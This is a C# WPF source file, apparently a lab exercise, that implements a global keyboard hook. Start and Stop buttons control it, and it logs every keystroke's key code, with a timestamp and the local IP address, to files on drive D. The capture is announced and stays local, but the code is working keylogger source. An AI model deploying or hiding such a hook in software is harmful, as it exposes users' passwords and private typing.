using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows;

namespace AppOC_WPF
{
    public partial class Lb8Window2 : Window
    {
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc;
        private static IntPtr _hookID = IntPtr.Zero;

        public Lb8Window2()
        {
            InitializeComponent();
        }

        private void StartButton_Click(object sender, RoutedEventArgs e)
        {
            Start();
            MessageBox.Show("Перехват клавиш запущен.");
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            Stop();
            MessageBox.Show("Перехват клавиш остановлен.");
        }

        public static void Start()
        {
            _proc = HookCallback;
            _hookID = SetHook(_proc);
        }

        public static void Stop()
        {
            UnhookWindowsHookEx(_hookID);
            _hookID = IntPtr.Zero; // Сброс ID хука
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                LogKey(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void LogKey(int vkCode)
        {
            // Записываем в файл (например, "keys.log")
            File.AppendAllText("D:\\Пример\\keysWords.txt", $"{DateTime.Now}: {vkCode}\n");

            // Получаем локальный IP-адрес
            string ipAddress = GetLocalIPAddress();
            File.AppendAllText("D:\\Пример\\keysIp.txt", $"IP: {ipAddress}\n");
        }

        private static string GetLocalIPAddress()
        {
            string hostName = Dns.GetHostName(); // Получаем имя хоста
            IPAddress[] addresses = Dns.GetHostAddresses(hostName); // Получаем массив IP-адресов

            foreach (IPAddress address in addresses)
            {
                if (address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) // Проверяем, что это IPv4
                {
                    return address.ToString(); // Возвращаем первый найденный IPv4 адрес
                }
            }

            return "IP адрес не найден"; // Если адрес не найден
        }

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
